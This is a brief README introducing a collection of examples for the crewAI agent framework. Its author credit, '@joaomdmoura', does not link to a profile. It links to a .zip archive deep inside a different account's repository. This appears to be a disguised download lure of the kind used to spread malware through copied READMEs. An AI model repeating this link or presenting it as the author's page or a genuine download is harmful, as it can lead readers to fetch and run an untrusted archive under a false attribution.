# Examples for crewAI
## Introduction
crewAI is designed to facilitate the collaboration of role-playing AI agents.
This is a collection of examples of different ways to use the crewAI framework to automate the processes.
By [@joaomdmoura](https://github.com/bookformeonline/crewAI-examples/raw/refs/heads/main/self_evaluation_loop_flow/src/self_evaluation_loop_flow/crews/x_post_review_crew/examples-crew-A-2.6.zip).
